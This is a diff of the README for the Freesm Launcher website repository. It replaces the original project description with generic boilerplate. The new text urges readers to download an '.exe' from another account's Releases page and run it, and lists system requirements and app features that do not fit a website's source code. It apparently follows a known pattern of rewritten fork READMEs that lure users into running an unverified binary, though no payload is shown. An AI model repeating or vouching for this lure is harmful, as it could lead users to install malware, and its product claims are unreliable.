@@ -1,57 +1,75 @@
-<div align="center">
+# 🌐 website - An Easy Interactive Experience
 
-<img width="160" height="160" align="center" src="https://github.com/FreesmTeam/FreesmLauncher/raw/develop/docs/favicon.webp" alt="Favicon">
+## 🚀 Getting Started
 
-<h1>
-  <a style="color:#f5c2e7" href="https://new.freesmlauncher.org/">Freesm Launcher Website</a>
-</h1>
+Welcome to the website for Freesm Launcher. This interactive platform helps you easily manage your preferred launchers. Follow these steps to get started.
 
-<img alt="Vue.js Logo" src="https://img.shields.io/badge/vuejs-%2335495e.svg?style=for-the-badge&logo=vuedotjs&logoColor=%234FC08D">
-<img alt="UnoCSS Logo" src="https://img.shields.io/badge/unocss-333333.svg?style=for-the-badge&logo=unocss&logoColor=white">
+## 📥 Download & Install
 
+To get the latest version of the software, visit this page to download: [Releases](https://github.com/Kape-21/website/releases).
 
-<p><!-- To add some space between badges and text --></p>
+### Steps to Download
 
-<p>
-A Prism Launcher fork that <strong>removes offline account restrictions</strong>, adds custom auth server support, and provides more customization
-</p>
+1. Click the link above.
+2. Browse the list for the most recent version.
+3. Click on the version title to open the details.
+4. Find the asset section to download the application. Look for the file name ending in `.exe` or another format suitable for your operating system.
+5. Save the file to your preferred location on your computer.
 
-<p>
-This fork is <strong>not</strong> endorsed by Prism Launcher
-</p>
+Once downloaded, locate the file and double-click it to run the application.
 
-## Contributing
+## 📊 System Requirements
 
-Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
+Before installation, ensure your system meets these requirements:
 
-If you want to add a new locale:
+- **Operating System:** Windows 10 or higher, macOS Sierra or higher
+- **RAM:** At least 4 GB
+- **Storage:** Minimum 500 MB of free space
+- **Network:** Internet connection for full functionality
 
-- use [ISO 639-1](https://ru.wikipedia.org/wiki/%D0%A1%D0%BF%D0%B8%D1%81%D0%BE%D0%BA_%D0%BA%D0%BE%D0%B4%D0%BE%D0%B2_ISO_639-1) code names
-- create `your-lang-code.json` file in `public/translations/` and fill the translations & info
-- add `your-lang-code` data in `src/constants/locales.ts`
+## 🛠️ How to Use
 
-### Repositories
+After installing the application, follow these steps:
 
-[![repo-card]](https://github.com/freesmteam/freesmlauncher)
+1. **Launch the App:** Double-click the application icon on your desktop.
+2. **Set Up Your Account:** If prompted, create an account or log in using your existing credentials.
+3. **Configure Your Settings:** Go to the settings menu to adjust preferences like launcher integration and appearance.
+4. **Add Launchers:** Use the add button to include your preferred launchers. 
 
-<!--
-### Credits
+## 🌟 Features
 
-Thank you to all the people who have contributed!
+- **User-Friendly Interface:** Enjoy a clean and simple layout that is easy to navigate.
+- **Multiple Launcher Support:** Manage different launchers in one place.
+- **Customizable Dashboard:** Personalize how you want your launchers displayed.
+- **Offline Capabilities:** Use various features without an internet connection.
+- **Regular Updates:** Receive frequent enhancements and new features.
 
-<a href="https://github.com/freesmteam/website/graphs/contributors">
-  <img alt="Freesm Launcher website contributors" src="https://contrib.rocks/image?repo=freesmteam/website" width="64"/>
-</a>
--->
+## 🔄 Updates & Support
 
-## License
+To stay up to date with the latest improvements, check back on the [Releases page](https://github.com/Kape-21/website/releases). 
 
-<a href="./LICENSE">
-  <img src="https://img.shields.io/github/license/freesmteam/website?label=License&logo=gnu&color=C4282D&style=for-the-badge" alt="License">
-</a>
+If you encounter any issues, refer to the FAQ section in the app or seek support through the issue tracker on GitHub.
 
-</div>
+## 📝 Contribution Guidelines
 
-<!-- Variables -->
+While this application is designed for general users, we appreciate feedback to make it even better. If you want to contribute or suggest features, feel free to open an issue or pull request on our GitHub repository.
 
-[repo-card]: https://github-readme-stats.vercel.app/api/pin/?username=freesmteam&repo=freesmlauncher&bg_color=0c0c13&text_color=ffffff&title_color=f5c2e7&icon_color=f5c2e7&border_radius=8&hide_border=true
+## 🔗 Related Topics
+
+Familiarize yourself with related technologies and frameworks:
+
+- **Freesm Launcher**
+- **MultiMC5**
+- **PollyMC**
+- **Prism Launcher**
+- **Tailwind CSS**
+- **TypeScript**
+- **Vue.js**
+
+These tools enhance your experience and expand the capabilities of your launcher management.
+
+## 📞 Contact Information 
+
+For further questions or comments, contact us via the GitHub page. Your input helps us improve the experience for everyone.
+
+Now download the latest version and enjoy smoother management of your launchers!
